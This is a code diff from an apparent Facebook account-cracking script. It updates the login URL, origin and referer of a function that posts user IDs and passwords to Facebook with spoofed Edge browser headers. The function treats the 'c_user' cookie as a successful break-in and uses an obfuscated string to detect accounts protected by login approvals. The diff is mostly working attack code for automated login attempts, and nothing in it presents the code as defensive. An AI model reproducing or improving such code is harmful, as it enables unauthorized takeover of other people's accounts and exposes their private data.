@@ -1647,10 +1647,10 @@ def freeq(uid,pwx,tl):
             'cache-control': 'no-cache',
             'content-type': 'application/x-www-form-urlencoded',
             'dpr': '1',
-            'origin': 'https://hi-in.facebook.com',
+            'origin': 'https://www.facebook.com',
             'pragma': 'no-cache',
             'priority': 'u=0, i',
-            'referer': 'https://hi-in.facebook.com/?ref=homescreenpwa',
+            'referer': 'https://www.facebook.com/?ref=homescreenpwa',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
             'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.112", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
@@ -1666,7 +1666,7 @@ def freeq(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
             'viewport-width': '1440',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
+            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
             po = Session.post(url, cookies=cookies, headers=headers, data=data, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
